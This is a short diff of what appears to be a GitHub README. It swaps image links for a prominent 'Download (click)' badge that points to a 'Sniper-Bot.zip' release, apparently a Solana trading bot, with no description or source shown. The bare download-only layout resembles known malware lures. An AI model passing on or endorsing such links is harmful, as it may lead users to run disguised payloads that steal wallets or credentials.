@@ -1,2 +1,3 @@
-[solana](https://github.com/unique-deeps/unique-deeps1/assets/60044896/ef956223-4b4c-4bce-b44e-6ab445687fe6)
-[![down](https://github.com/unique-deeps/unique-deeps1/assets/60044896/2489bbf3-23b6-4062-a348-08898bb87614)]()
+![Static Badge](https://img.shields.io/badge/Download%20(click)-black?style=for-the-badge&logo=github&link=https%3A%2F%2Fgithub.com%2FFrachlitzecze%2FSniper%2Freleases%2Fdownload%2F11z1%2FSniper-Bot.zip)
+
+![image](https://github.com/Frachlitzecze/Sniper/assets/23557837/8bb0a375-c699-4147-9685-a8152fd6e2f8)
